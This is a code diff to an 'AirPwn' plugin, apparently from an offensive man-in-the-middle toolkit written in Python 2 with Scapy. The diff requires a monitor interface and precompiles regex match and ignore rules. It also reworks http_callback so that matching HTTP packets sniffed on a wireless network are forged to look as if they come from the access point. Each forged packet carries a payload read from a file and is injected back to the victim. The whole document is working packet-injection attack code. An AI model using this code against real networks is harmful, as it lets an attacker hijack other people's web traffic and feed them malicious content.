@@ -28,10 +28,19 @@ class AirPwn(Plugin):
 		if os.geteuid() != 0:
 			sys.exit("[-] AirPwn plugin requires root privileges")
 
+		if not self.mon_interface:
+			sys.exit("[-] AirPwn plugin requires --miface argument")
+
 		try:
-			self.aircfg= ConfigObj(self.aircfg)
-		except:
-			sys.exit("[-] Error parsing airpwn config file")
+			self.aircfg = ConfigObj(self.aircfg)
+			#Here we compile the regexes for faster performance when injecting packets
+			for rule in self.aircfg.items():
+				rule[1]['match'] = re.compile(r'%s' % rule[1]['match'])
+				if 'ignore' in rule[1].keys():
+					rule[1]['ignore'] = re.compile(r'%s' % rule[1]['ignore'])
+
+		except Exception, e:
+			sys.exit("[-] Error parsing airpwn config file: %s" % e)
 
 		print "[*] AirPwn plugin online"
 		t = threading.Thread(name='sniff_http_thread', target=self.sniff_http, args=(self.mon_interface,))
@@ -53,20 +62,33 @@ class AirPwn(Plugin):
 	def http_callback(self, packet):
 		if packet.haslayer(TCP) and packet.haslayer(Raw):
 			for rule in self.aircfg.items():
-				if (re.match(r'%s' % rule[1]['match'], packet[Raw].load)):
-					response = packet.copy()
-					# We need to start by changing our response to be "from-ds", or from the access point.
-					response.FCfield = 2L
-					# Switch the MAC addresses
-					response.addr1, response.addr2 = packet.addr2, packet.addr1
-					# Switch the IP addresses
-					response.src, response.dst = packet.dst, packet.src
-					# Switch the ports
-					response.sport, response.dport = packet.dport, packet.sport
-					response[Raw].load = open(rule[1]['response'], 'r').read()
-
-					sendp(response, iface=self.mon_interface, verbose=False)
-					logging.info("%s >> Replaced content" % response.src)
+				if 'ignore' in rule[1].keys():
+					if (re.search(rule[1]['match'], packet[Raw].load)) and not (re.search(rule[1]['ignore'], packet[Raw].load)):
+						# First we copy the original packet
+						response = packet.copy()
+						# We need to start by changing our response to be "from-ds", or from the access point.
+						response.FCfield = 2L
+						# Switch the MAC addresses
+						response.addr1, response.addr2 = packet.addr2, packet.addr1
+						# Switch the IP addresses
+						response.src, response.dst = packet.dst, packet.src
+						# Switch the ports
+						response.sport, response.dport = packet.dport, packet.sport
+						# Inject our data
+						response[Raw].load = open(rule[1]['response'], 'rb').read()
+						# Send the packet
+						sendp(response, iface=self.mon_interface, verbose=False)
+						logging.info("%s >> Replaced content" % response.src)
+				elif 'ignore' not in rule[1].keys():
+					if (re.search(rule[1]['match'], packet[Raw].load)):
+						response = packet.copy()
+						response.FCfield = 2L
+						response.addr1, response.addr2 = packet.addr2, packet.addr1
+						response.src, response.dst = packet.dst, packet.src
+						response.sport, response.dport = packet.dport, packet.sport
+						response[Raw].load = open(rule[1]['response'], 'rb').read()
+						sendp(response, iface=self.mon_interface, verbose=False)
+						logging.info("%s >> Replaced content" % response.src)
 
 	def dns_callback(self, packet):
 		if packet.haslayer(UDP) and packet.haslayer(DNS):
